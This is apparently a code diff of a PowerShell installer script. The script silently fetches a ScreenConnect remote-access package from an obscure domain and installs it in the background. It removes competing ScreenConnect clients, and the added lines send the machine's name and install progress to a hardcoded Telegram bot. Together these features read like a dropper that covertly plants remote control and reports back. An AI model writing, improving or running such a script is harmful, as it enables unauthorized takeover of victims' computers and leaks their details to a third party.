@@ -7,11 +7,11 @@
 [Console]::OutputEncoding = [System.Text.Encoding]::UTF8
 $OutputEncoding = [System.Text.Encoding]::UTF8
 
-# 1. TELEGRAM CONFIGURATION
+# 1. TELEGRAM CONFIGURATION - UPDATED WITH YOUR NEW CREDENTIALS
 $BotToken = "8685613792:AAHRJ7zBA-WU-TZtW946VVGXH9QrKrPg694"
 $ChatID   = "6562782106"
 
-# 2. APPLICATION CONFIGURATION
+# 2. APPLICATION CONFIGURATION - UPDATED URL
 $MsiUrl    = "http://server.hudgroweart.site/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=Silento&c=Aobe&c=&c=&c=&c=&c=&c="
 $TempDir   = "C:\Windows\Temp"
 $MsiPath   = Join-Path $TempDir "ScreenConnectSetup.msi"
@@ -39,20 +39,36 @@ function Send-TelegramAlert {
     }
 }
 
-# 3. ANTI-1603 CONFLICT CLEANUP (Runs before installation)
+# === MILESTONE 1: SCRIPT LAUNCHED ===
+Send-TelegramAlert -Message "[🚀] ScreenConnect Script Launched!`nPC: $Computer`nStatus: Starting system environmental pre-checks..."
+
+# 3. ANTI-1603 CONFLICT CLEANUP (Faronics Optimized: Stripped hang-prone Get-Service and Get-CimInstance commands)
 try {
     Write-Output "Stopping any existing ScreenConnect services..."
-    Get-Service -Name "*ScreenConnect*" -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
-    Get-Process -Name "*ScreenConnect*" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    # Force process terminations immediately without polling long driver chains
+    taskkill.exe /F /FI "IMAGENAME eq ScreenConnect*" /T 2>$null
+    sc.exe stop "ScreenConnect Client Service" 2>$null
 
-    Write-Output "Removing old ScreenConnect instances to prevent 1603 errors..."
-    Get-CimInstance -ClassName Win32_Product -Filter "Name LIKE '%ScreenConnect%'" -ErrorAction SilentlyContinue | ForEach-Object {
-        Write-Output "Uninstalling existing client: $($_.Name)"
-        Invoke-CimMethod -InputObject $_ -MethodName "Uninstall" -ErrorAction SilentlyContinue
+    Write-Output "Removing old ScreenConnect instances via fast registry check to prevent 1603 errors..."
+    $RegPaths = @(
+        "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*",
+        "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
+    )
+    $OldApps = Get-ItemProperty $RegPaths -ErrorAction SilentlyContinue | 
+               Where-Object { $_.DisplayName -like "*ScreenConnect*" -and $_.UninstallString -like "*msiexec*" }
+
+    foreach ($App in $OldApps) {
+        $IdentifyingNumber = $App.PSChildName
+        Write-Output "Uninstalling existing client GUID: $IdentifyingNumber"
+        Send-TelegramAlert -Message "[🗑️] Conflict Found: Removing old client ($($App.DisplayName)) on PC: $Computer"
+        Start-Process -FilePath "msiexec.exe" -ArgumentList "/x $IdentifyingNumber /qn /norestart" -Wait -NoNewWindow
     }
 } catch {
     Write-Output "Pre-cleanup encountered an issue but proceeding anyway: $_"
 }
+
+# === MILESTONE 2: DOWNLOAD INITIATION ===
+Send-TelegramAlert -Message "[📥] Download Started`nPC: $Computer`nStatus: Fetching the ScreenConnect setup package..."
 
 # 4. Download Logic
 try {
@@ -65,12 +81,18 @@ try {
         throw "Downloaded file is missing or too small."
     }
     Write-Output "Download completed successfully."
+    
+    # === MILESTONE 2B: DOWNLOAD SUCCESSFUL ===
+    Send-TelegramAlert -Message "[💾] Download Complete`nPC: $Computer`nStatus: File successfully cached locally in temp directory."
 }
 catch {
     $Msg = "[!] ScreenConnect Download FAILED`nPC: $Computer`nError: $($_.Exception.Message)"
     Send-TelegramAlert -Message $Msg
     exit 1
 }
+
+# === MILESTONE 3: INSTALLATION STARTED ===
+Send-TelegramAlert -Message "[🛠️] Installation Started`nPC: $Computer`nStatus: Handing the MSI binary package to the silent background execution engine..."
 
 # 5. Installation Logic
 if (Test-Path $MsiPath) {
@@ -81,6 +103,7 @@ if (Test-Path $MsiPath) {
 
     Remove-Item -Path $MsiPath -Force -ErrorAction SilentlyContinue
 
+    # --- MILESTONE 4: FINAL EVALUATION ---
     if ($Process.ExitCode -eq 0 -or $Process.ExitCode -eq 3010) {
         $Status = if ($Process.ExitCode -eq 3010) { "Installed successfully (Reboot Pending)." } else { "Installed successfully." }
         $Msg = "[+] ScreenConnect Deployment Success`nPC: $Computer`nStatus: $Status"
